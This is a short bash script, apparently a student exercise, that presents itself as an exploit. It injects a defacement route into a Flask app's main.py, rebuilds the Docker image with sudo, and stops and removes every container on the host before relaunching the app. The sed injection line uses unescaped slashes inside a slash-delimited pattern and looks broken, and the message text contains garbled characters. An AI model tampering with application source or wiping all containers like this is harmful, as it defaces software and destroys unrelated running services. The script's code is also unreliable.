#!/bin/bash
# exploit.sh - Injects a malicious route into a Flask app via Jenkins pipeline
# Author: Appar Thebe

echo "[*] Backing up original main.py..."
cp src/main.py src/main.py.bak

echo "[*] Injecting malicious route..."
sed -i "/@app.route('/')/a @app.route('/hack')\ndef hacked():\n    return \"You are hacked! N Iâ€™m Appar Thebe (11726368)\"" src/main.py

echo "[*] Rebuilding Docker image..."
sudo docker build --no-cache -t flask-app .

echo "[*] Cleaning up old containers..."
sudo docker stop $(sudo docker ps -aq)
sudo docker rm $(sudo docker ps -aq)

echo "[*] Running new container..."
sudo docker run -d -p 5000:5000 flask-app

echo "[*] Exploit completed. Visit http://localhost:5000/hack"
